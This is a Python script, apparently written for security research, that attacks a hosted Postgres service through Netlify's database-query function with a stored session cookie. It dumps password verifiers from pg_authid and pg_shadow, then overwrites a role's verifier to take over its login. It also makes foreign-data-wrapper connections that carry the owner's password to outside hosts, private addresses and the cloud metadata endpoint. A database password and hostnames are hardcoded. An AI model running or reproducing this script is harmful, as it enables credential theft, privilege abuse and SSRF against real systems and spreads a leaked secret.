# -*- coding: utf-8 -*-
"""第二轮:pg_authid/pg_shadow 泄露 + 写权限验证 + FDW 带凭据出站矩阵
(全部独立于已提交的 pg_repack 链)
S1 成员关系 + pg_authid/pg_shadow dump(存文件,控制台截断显示)
S2 pg_authid 写权限:临时角色 k_t1/k_t2 交叉改 verifier + 外部 psycopg 登录验证
S3 FDW 出站矩阵(带 A owner 凭据 user mapping,connect_timeout=8)
S4 action=check/transaction 探测 + rag_* 扩展尝试
零破坏:仅临时对象 k_/srv_e/ft_e,结束清理
"""
import http.client, ssl, gzip, brotli, json, sys, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
EP_A = 'ep-autumn-cherry-ay51mbqz.c-5.us-east-2.db.netlify.com'
PW_A = 'npg_MtTpnyk2LE4j'
EP_B = 'ep-lucky-sound-aeh4epbm.c-2.us-east-2.db.netlify.com'
DUMP = r'D:\scan\netlify_report\_dbq_authid_dump.json'


def _req(body, timeout=40):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:6000].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'HTTP-EXC %r' % e
    finally:
        conn.close()
    return st, out


def q(sql, timeout=40, trunc=2500):
    st, out = _req({'siteId': SITE_A, 'action': 'query', 'sql': sql}, timeout=timeout)
    return st, out[:trunc]


def show(label, sql, trunc=2000, timeout=40):
    st, out = q(sql, timeout, trunc)
    print('%-46s [%d] %s' % (label, st, out.replace('\n', ' ')[:trunc]))
    return st, out


def ext_login(user, pw, host=EP_A, db='netlifydb'):
    import psycopg
    try:
        with psycopg.connect(host=host, port=5432, dbname=db, user=user, password=pw,
                             sslmode='require', connect_timeout=10) as c:
            with c.cursor() as cur:
                cur.execute('select current_user, session_user')
                row = cur.fetchone()
        return 'LOGIN-OK %s' % (row,)
    except Exception as e:
        return 'LOGIN-FAIL %s' % str(e).replace('\n', ' ')[:200]


_seq = itertools.count(1)


def fdw_eg(label, host, port=5432, um_user='netlifydb_owner', um_pw=PW_A, cto='8'):
    """FDW + user mapping(带密码)连接探测:过本地认证代理后的真实出站结果"""
    n = 'e%d' % next(_seq)
    steps = [
        ("create server %s" % n,
         "create server if not exists srv_%s foreign data wrapper postgres_fdw "
         "options (host '%s', port '%s', dbname 'x', connect_timeout '%s')" % (n, host, port, cto)),
        ("um %s" % n,
         "create user mapping if not exists for netlifydb_owner server srv_%s "
         "options (user '%s', password '%s')" % (n, um_user, um_pw)),
        ("ft %s" % n,
         "create foreign table if not exists ft_%s(id int) server srv_%s "
         "options (schema_name 'public', table_name 'k_z')" % (n, n)),
        ("read %s" % n, 'select * from ft_%s' % n),
    ]
    print('--- %s (host=%s:%s user=%s)' % (label, host, port, um_user))
    last = ''
    for desc, sql in steps:
        st, out = q(sql, timeout=50, trunc=500)
        last = out
        print('    %-10s [%d] %s' % (desc, st, out.replace('\n', ' ')[:450]))
    for sql in ("drop foreign table if exists ft_%s" % n,
                "drop user mapping if exists for netlifydb_owner server srv_%s" % n,
                "drop server if exists srv_%s" % n):
        q(sql, timeout=15)
    return last


print('========== S1. 成员关系 + pg_authid/pg_shadow dump ==========')
show('pg_* 成员(根因确认)', "select rolname from pg_roles where pg_has_role('netlifydb_owner', oid, 'member') "
     "and rolname like 'pg\\_%' order by 1", 800)
show('neon_superuser 成员', "select pg_has_role('netlifydb_owner','neon_superuser','member') as m_neon_super", 300)

rows = []
st, out = q("select rolname, rolsuper, rolcanlogin, rolpassword from pg_authid order by 1", trunc=6000)
print('== pg_authid 原始输出(截断) ==')
print(out[:3500])
st2, out2 = q("select rolname, rolpassword from pg_shadow order by 1", trunc=3000)
print('== pg_shadow 原始输出 ==')
print(out2[:2000])

print()
print('========== S2. pg_authid 写权限验证 ==========')
print('[1] create 临时角色 k_t1/k_t2:')
show('create k_t1', "create role k_t1 login password 'aaa111'", 300)
show('create k_t2', "create role k_t2 login password 'bbb222'", 300)
print('[2] 基线外部登录 k_t1/aaa111:')
print('    ' + ext_login('k_t1', 'aaa111'))
print('[3] UPDATE pg_authid 交叉改 k_t1 verifier -> k_t2 的:')
st, out = q("update pg_authid set rolpassword = (select rolpassword from pg_authid "
            "where rolname = 'k_t2') where rolname = 'k_t1'", timeout=30, trunc=400)
print('    [%d] %s' % (st, out.replace('\n', ' ')[:400]))
print('[4] 改后登录验证:')
print('    k_t1/bbb222(应 OK 若写生效): ' + ext_login('k_t1', 'bbb222'))
print('    k_t1/aaa111(应 FAIL):        ' + ext_login('k_t1', 'aaa111'))
print('[5] 清理临时角色:')
q("drop role if exists k_t1", timeout=20)
q("drop role if exists k_t2", timeout=20)
print('    done')

print()
print('========== S3. FDW 带凭据出站矩阵 ==========')
fdw_eg('ctrl A endpoint(netlifydb)', EP_A)
fdw_eg('ctrl B 新 endpoint', EP_B)
fdw_eg('裸 proxy db.netlify.com', 'db.netlify.com')
fdw_eg('公网 example.com:80', 'example.com', 80)
fdw_eg('公网 example.com:443', 'example.com', 443)
fdw_eg('公网 1.1.1.1:5432', '1.1.1.1')
fdw_eg('元数据 169.254.169.254:80', '169.254.169.254', 80)
fdw_eg('元数据 169.254.169.254:5432', '169.254.169.254')
fdw_eg('本机链路 169.254.254.254:5432', '169.254.254.254')
fdw_eg('RFC1918 10.0.0.1:5432', '10.0.0.1')
fdw_eg('坏凭据对照 example.com:80(user=x pw=x)', 'example.com', 80, um_user='x', um_pw='x')
fdw_eg('NXDOMAIN 对照 .invalid:80', 'nonexistent-zz-12345.invalid', 80)

print()
print('========== S4. action=check/transaction + rag 扩展 ==========')
for body in ({'siteId': SITE_A, 'action': 'check'},
             {'siteId': SITE_A, 'action': 'check', 'sql': 'select 1'},
             {'siteId': SITE_A, 'action': 'transaction', 'sql': 'select 1'},
             {'siteId': SITE_A, 'action': 'transaction', 'sql': 'select 1; select 2'},
             {'siteId': SITE_A, 'action': 'query', 'sql': 'select 1; select 2'}):
    st, out = _req(body, timeout=25)
    print('%-66s [%d] %s' % (json.dumps(body)[:64], st, out[:260].replace('\n', ' ')))

for ext in ('rag_bge_small_en_v15', 'rag_jina_reranker_v1_tiny_en'):
    st, out = q("create extension if not exists %s" % ext, timeout=30, trunc=500)
    print('create %-28s [%d] %s' % (ext, st, out.replace('\n', ' ')[:500]))
    if 'CREATE EXTENSION' in out:
        st2, out2 = q("select n.nspname||'.'||p.proname||'('||pg_get_function_identity_arguments(p.oid)||')', "
                      "r.rolname, p.prosecdef from pg_proc p join pg_namespace n on p.pronamespace=n.oid "
                      "join pg_roles r on p.proowner=r.oid join pg_depend d on d.objid=p.oid "
                      "and d.classid='pg_proc'::regclass join pg_extension e on d.refobjid=e.oid "
                      "where e.extname='%s' order by 1" % ext, timeout=30, trunc=1500)
        print('    objects: %s' % out2.replace('\n', ' ')[:1400])
        q("drop extension if exists %s cascade" % ext, timeout=30)
        print('    dropped')

print()
print('========== 清理检查 ==========')
st, out = q("select extname from pg_extension order by 1", trunc=500)
print('扩展: %s' % out)
st, out = q("select rolname from pg_roles where rolname like 'k\\_%'", trunc=300)
print('残留角色: %s' % out)
